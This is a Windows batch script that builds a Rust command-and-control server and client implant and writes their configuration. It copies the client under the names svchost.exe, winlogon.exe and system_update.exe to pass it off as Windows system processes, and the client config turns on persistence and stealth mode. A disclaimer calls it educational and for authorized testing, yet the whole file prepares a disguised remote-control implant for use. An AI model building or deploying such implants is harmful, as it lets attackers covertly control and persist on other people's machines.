@echo off
REM C2 Build Script for Windows
REM For educational and authorized testing purposes only

echo 🔨 Building C2 Server and Client
echo ==================================

REM Check if Rust is installed
where cargo >nul 2>nul
if %ERRORLEVEL% NEQ 0 (
    echo [ERROR] Rust/Cargo is not installed. Please install from https://rustup.rs/
    exit /b 1
)

echo [INFO] Rust version:
rustc --version

REM Create output directory
if not exist output mkdir output

REM Build server
echo [INFO] Building C2 Server...
cd c2_server
cargo build --release
if %ERRORLEVEL% NEQ 0 (
    echo [ERROR] Server build failed
    exit /b 1
)
copy target\release\c2_server.exe ..\output\
echo [SUCCESS] Server build completed
cd ..

REM Build client
echo [INFO] Building C2 Client...
cd c2_client
cargo build --release
if %ERRORLEVEL% NEQ 0 (
    echo [ERROR] Client build failed
    exit /b 1
)
copy target\release\c2_client.exe ..\output\
echo [SUCCESS] Client build completed

REM Create obfuscated copies
copy target\release\c2_client.exe ..\output\svchost.exe
copy target\release\c2_client.exe ..\output\winlogon.exe
copy target\release\c2_client.exe ..\output\system_update.exe
cd ..

REM Create configuration files
echo [INFO] Creating configuration templates...

echo # C2 Server Configuration > output\server_config.toml
echo [server] >> output\server_config.toml
echo bind_address = "0.0.0.0" >> output\server_config.toml
echo bind_port = 4444 >> output\server_config.toml
echo rsa_key_size = 2048 >> output\server_config.toml
echo heartbeat_timeout = 300 >> output\server_config.toml
echo max_clients = 100 >> output\server_config.toml

echo # C2 Client Configuration > output\client_config.toml
echo [client] >> output\client_config.toml
echo server_address = "127.0.0.1" >> output\client_config.toml
echo server_port = 4444 >> output\client_config.toml
echo reconnect_delay = 30 >> output\client_config.toml
echo heartbeat_interval = 60 >> output\client_config.toml
echo persistence_enabled = true >> output\client_config.toml
echo stealth_mode = true >> output\client_config.toml

echo [SUCCESS] Build completed successfully!
echo.
echo 📁 Output files in .\output\:
dir output
echo.
echo [WARNING] Remember: Use this tool only for authorized testing!
echo [INFO] Server: .\output\c2_server.exe
echo [INFO] Client: .\output\c2_client.exe
echo.
echo 🚀 To start:
echo 1. Run server: .\output\c2_server.exe
echo 2. Run client: .\output\c2_client.exe --server ^<server_ip^>

pause
